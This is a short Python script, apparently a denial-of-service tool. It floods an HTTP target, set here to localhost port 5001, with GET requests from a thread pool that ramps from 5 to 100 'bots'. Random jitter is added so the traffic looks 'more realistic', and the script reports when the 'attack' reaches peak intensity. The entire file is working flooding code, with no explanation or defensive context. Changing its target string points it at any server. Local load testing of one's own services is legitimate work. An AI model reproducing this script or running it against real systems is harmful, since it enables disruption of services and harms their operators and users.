import requests
import threading
import time
import random

TARGET = "http://127.0.0.1:5001"

# Config
INITIAL_THREADS = 5
MAX_THREADS = 100
RAMP_STEP = 5
RAMP_DELAY = 2


def attack():
    while True:
        try:
            # random jitter → more realistic traffic
            time.sleep(random.uniform(0.01, 0.1))
            requests.get(TARGET, timeout=1)
        except:
            pass


def start_attack():
    threads = []
    current_threads = INITIAL_THREADS

    while current_threads <= MAX_THREADS:
        print(f"[+] Active bots: {current_threads}")

        for _ in range(RAMP_STEP):
            t = threading.Thread(target=attack, daemon=True)
            t.start()
            threads.append(t)

        current_threads += RAMP_STEP
        time.sleep(RAMP_DELAY)

    print("[!] Attack reached peak intensity")

    while True:
        time.sleep(1)


if __name__ == "__main__":
    start_attack()
